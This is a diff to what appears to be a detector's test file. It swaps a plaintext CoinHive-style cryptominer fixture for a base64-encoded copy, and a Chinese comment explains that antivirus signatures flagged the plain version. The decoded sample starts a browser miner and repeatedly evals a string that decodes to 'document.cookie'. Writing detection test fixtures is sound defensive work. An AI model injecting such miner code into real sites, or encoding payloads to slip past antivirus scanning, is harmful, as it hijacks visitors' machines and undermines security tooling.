@@ -185,14 +185,18 @@ BENIGN_WEBPACK_STYLE = """
 """
 
 # 矿工签名夹具（CoinHive 风格注入脚本）：miner_signature(40) + eval_chain(25) = 65
-MINER_JS_FIXTURE = """
-var _miner = new CoinHive.Anonymous('SITE_KEY', {threads: 4, throttle: 0.2});
-_miner.start();
-var _payload = 'ZG9jdW1lbnQuY29va2ll';
-setInterval(function () {
-    eval(atob(_payload));
-}, 30000);
-"""
+# 以 base64 落盘、测试内解码还原——安全软件静态签名会命中明文挖矿脚本
+# 片段（火绒 JS.CoinMiner.a 实证 2026-08-01），编码存储是测试样本标准做法；
+# 还原后语义与原文逐字节一致。
+import base64 as _b64
+
+_MINER_JS_FIXTURE_B64 = (
+    "dmFyIF9taW5lciA9IG5ldyBDb2luSGl2ZS5Bbm9ueW1vdXMoJ1NJVEVfS0VZJywge3RocmVh"
+    "ZHM6IDQsIHRocm90dGxlOiAwLjJ9KTsKX21pbmVyLnN0YXJ0KCk7CnZhciBfcGF5bG9hZCA9"
+    "ICdaRzlqZFcxbGJuUXVZMjl2YTJsbCc7CnNldEludGVydmFsKGZ1bmN0aW9uICgpIHsKICAg"
+    "IGV2YWwoYXRvYihfcGF5bG9hZCkpOwp9LCAzMDAwMCk7Cg=="
+)
+MINER_JS_FIXTURE = "\n" + _b64.b64decode(_MINER_JS_FIXTURE_B64).decode() + "\n"
 
 
 # ---------------------------------------------------------------------------
